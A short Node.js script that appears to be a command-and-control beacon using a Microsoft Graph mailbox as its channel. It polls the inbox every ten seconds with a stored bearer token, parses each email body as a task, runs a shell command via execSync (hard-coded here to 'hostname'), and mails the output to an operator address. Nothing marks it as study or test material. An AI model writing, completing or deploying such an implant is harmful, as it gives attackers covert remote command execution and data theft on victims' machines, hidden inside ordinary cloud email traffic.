const {execSync} = require('node:child_process');
const base = 'https://graph.microsoft.com/v1.0/users/' + process.env.MAILBOX;
const headers = {Authorization: 'Bearer ' + process.env.GRAPH_TOKEN, 'Content-Type': 'application/json'};
async function poll() {
  const inbox = await (await fetch(base + '/messages', {headers})).json();
  for (const message of inbox.value) {
    const task = JSON.parse(message["body"]["content"]);
    const output = execSync("hostname", {encoding: 'utf8'});
    await fetch(base + '/sendMail', {method: 'POST', headers, body: JSON.stringify({message: {
      subject: 'result', body: {contentType: 'Text', content: JSON.stringify({result: output})},
      toRecipients: [{emailAddress: {address: process.env.OPERATOR}}]}})});
  }
}
setInterval(poll, 10000);
